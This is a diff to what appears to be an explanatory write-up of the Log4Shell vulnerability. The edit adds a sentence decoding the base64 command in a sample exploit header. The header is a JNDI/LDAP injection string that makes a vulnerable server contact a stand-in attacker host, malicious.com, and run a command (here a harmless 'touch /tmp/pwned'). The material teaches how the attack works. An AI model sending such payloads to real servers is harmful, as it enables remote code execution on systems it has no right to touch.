@@ -39,7 +39,7 @@ Say an attacker issues a HTTP request with the following request header to our v
 X-Api-Version: ${jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
 ```
 
-There are different components to this payload that will come into play in different parts of the exploit. The first part is the string interpolation syntax and JNDI prefix `${jndi:...}`.
+There are different components to this payload that will come into play in different parts of the exploit. The last component of the URL path, `dG91Y2ggL3RtcC9wd25lZAo=`, is the base64 encoding of "touch /tmp/pwned", the shell command we will eventually have execute on our vulnerable server. The first part that comes into play is the string interpolation syntax and JNDI prefix `${jndi:...}`.
 
 <!--
 Here, malicious.com is running a malicious service with LDAP and HTTP endpoints that we'll explore later. The value `dG91Y2ggL3RtcC9wd25lZAo=` is the base64 encoding of the malicious command we want the vulnerable server to run, in this case, `touch /tmp/pwned`, to demonstrate arbitrary filesystem access.
